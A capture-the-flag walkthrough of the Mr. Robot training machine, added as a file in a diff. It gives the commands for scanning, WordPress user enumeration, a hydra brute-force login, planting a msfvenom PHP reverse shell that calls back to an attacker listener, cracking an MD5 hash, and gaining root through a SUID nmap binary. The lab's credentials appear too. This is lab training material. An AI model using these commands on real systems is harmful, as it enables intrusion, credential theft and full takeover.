@@ -1,0 +1,119 @@
+Mr. Robot CTF Walkthrough  
+=========================
+
+Objective: Gain root access to the vulnerable machine and capture all 3 flags.
+
+Tools Used:
+-----------
+- nmap  
+- gobuster  
+- curl  
+- hydra  
+- wpscan  
+- msfvenom  
+- netcat (nc)  
+- john the ripper  
+- python3 (pty module)  
+- bash  
+- WordPress Admin Panel  
+- SUID binary (nmap)
+
+Approach Summary:
+-----------------
+At the start of the challenge, I explored the website's content and noticed videos styled as **Mr. Robot propaganda**, referencing fsociety and hacker themes. These weren’t typical CTF hints but helped create a realistic vibe and directed my attention to try common recon tactics like checking for `robots.txt`.
+
+This creative observation led me to explore:
+- Hidden files
+- WordPress structures
+- Dictionary wordlists used by hackers (like `fsocity.dic`)
+
+1. Full Port and Vulnerability Scan
+-----------------------------------
+- Ran full port and service scan:
+    nmap -sV --script vuln -T4 -p- [target IP]
+
+- Identified open web server on port 80.
+
+2. Discovered robots.txt
+------------------------
+- Navigated to:
+    http://[target IP]/robots.txt
+
+- Found sensitive entries:
+    - fsocity.dic
+    - key-1-of-3.txt
+
+- Downloaded both using curl.
+
+3. WordPress User Enumeration
+-----------------------------
+- Discovered WordPress on the main page.
+
+- Enumerated author ID via:
+    curl http://[target IP]/?author=1
+
+- Found username: elliot
+
+4. Brute-force Login
+--------------------
+- Used `fsocity.dic` to brute-force with hydra:
+    hydra -l elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Incorrect"
+
+- Found credentials:
+    Username: elliot  
+    Password: ER28-0652
+
+5. WordPress Admin Access
+-------------------------
+- Logged in to `/wp-admin`.
+
+- Modified `404.php` with a reverse shell payload.
+
+6. Reverse Shell Execution
+--------------------------
+- Generated PHP reverse shell:
+    msfvenom -p php/reverse_php LHOST=[attacker IP] LPORT=4444 -f raw > shell.php
+
+- Set up listener:
+    nc -lvnp 4444
+
+- Triggered shell by visiting 404 page.  
+- Gained access as `daemon`.
+
+7. Shell Stabilization
+----------------------
+- Used:
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    stty raw -echo; fg
+
+8. Priv Esc to User 'robot'
+---------------------------
+- Found and cracked password hash:
+    robot:c3fcd3d76192e4007dfb496cca67e13b
+
+- Used:
+    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
+
+- Password: abcdefghijklmnopqrstuvwxyz
+
+- Switched user:
+    su robot  
+- Retrieved second flag: `key-2-of-3.txt`
+
+9. Root Privilege Escalation
+----------------------------
+- Discovered SUID-enabled nmap binary:
+    /usr/local/bin/nmap
+
+- Used interactive mode:
+    nmap --interactive  
+    !sh  
+
+- Gained root shell.
+
+10. Final Flag
+--------------
+- Navigated to `/root`  
+- Retrieved `key-3-of-3.txt`
+
+Result: All 3 flags captured. Root access achieved. Machine fully pwned.
